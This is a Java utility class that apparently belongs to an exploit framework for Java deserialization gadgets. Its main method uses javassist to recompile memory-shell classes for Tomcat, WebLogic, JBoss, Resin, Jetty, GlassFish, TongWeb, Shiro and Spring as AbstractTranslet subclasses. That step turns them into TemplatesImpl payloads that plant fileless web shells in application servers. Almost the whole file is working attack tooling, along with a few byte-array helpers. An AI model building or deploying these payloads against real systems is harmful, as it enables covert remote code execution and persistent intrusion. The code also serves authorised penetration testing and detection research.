package core.gadgets.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import core.GenerateMemShell;
import core.enumtypes.PayloadType;
import core.memshell.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class Util {


    public static byte[] deleteAt(byte[] bs, int index) {
        int length = bs.length - 1;
        byte[] ret = new byte[length];

        if(index == bs.length - 1) {
            System.arraycopy(bs, 0, ret, 0, length);
        } else if(index < bs.length - 1) {
            for(int i = index; i < length; i++) {
                bs[i] = bs[i + 1];
            }

            System.arraycopy(bs, 0, ret, 0, length);
        }

        return ret;
    }

    public static byte[] addAtIndex(byte[] bs, int index, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, index);
        ret[index] = b;
        System.arraycopy(bs, index, ret, index + 1, length - index - 1);

        return ret;
    }

    public static byte[] addAtLast(byte[] bs, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, length-1);
        ret[length - 1] = b;

        return ret;
    }

    public static byte[] TemplateImplClassBytes(PayloadType type, Class<?> abstTranslet) throws Exception {
        CtClass clazz = null;
        byte[] classBytes = null;
        switch (type) {
            case tongweblistenermemshell:
                clazz = utils.Util.addSuperClass(TongWebListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case tongwebfiltermemshell:
                clazz = utils.Util.addSuperClass(TongWebFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case shiromemshell:
                ClassPool pool = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(Util.class);
                pool.insertClassPath(classPath);
                ShiroMemShell shiroMemShell = new ShiroMemShell();
                clazz =  shiroMemShell.genPayload(pool);
                CtClass superClass = pool.get(abstTranslet.getName());
                clazz.setSuperclass(superClass);
                classBytes = clazz.toBytecode();

                break;
            case weblogiclistenermemshell:
                clazz = utils.Util.addSuperClass(WeblogicListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case weblogicfiltermemshell:
                clazz = utils.Util.addSuperClass(WeblogicFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case commandmemshell:
                clazz = utils.Util.addSuperClass(CommandMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case jbosslistenermemshell:
                clazz = utils.Util.addSuperClass(JBossListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case jbossfiltermemshell:
                clazz = utils.Util.addSuperClass(JBossFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case resinfiltermemshell:
                clazz = utils.Util.addSuperClass(ResinFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case resinlistenermemshell:
                clazz = utils.Util.addSuperClass(ResinListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case jettyfiltermemshell:
                clazz = utils.Util.addSuperClass(JettyFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case jettylistenermemshell:
                clazz = utils.Util.addSuperClass(JettyListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case glassfishfiltermemshell:
                clazz = utils.Util.addSuperClass(GlassFishFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case glassfishlistenermemshell:
                clazz = utils.Util.addSuperClass(GlassFishListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case springwebfluxhandlermemshell:
                String codeStr = GenerateMemShell.generateMemShell("SpringWebfluxHandlerMemShellAbstractTranslet", "BASE64", "8");
                classBytes = core.utils.Util.base64Decode(codeStr);
                break;
            case tomcatfiltermemshell:
                clazz = utils.Util.addSuperClass(TomcatFilterMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case tomcatlistenermemshell:
                clazz = utils.Util.addSuperClass(TomcatListenerMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
            case springbootmemshell:
                clazz = utils.Util.addSuperClass(SpringBootMemShell.class, AbstractTranslet.class.getName());
                classBytes = clazz.toBytecode();
                break;
        }
        return classBytes;
    }
}
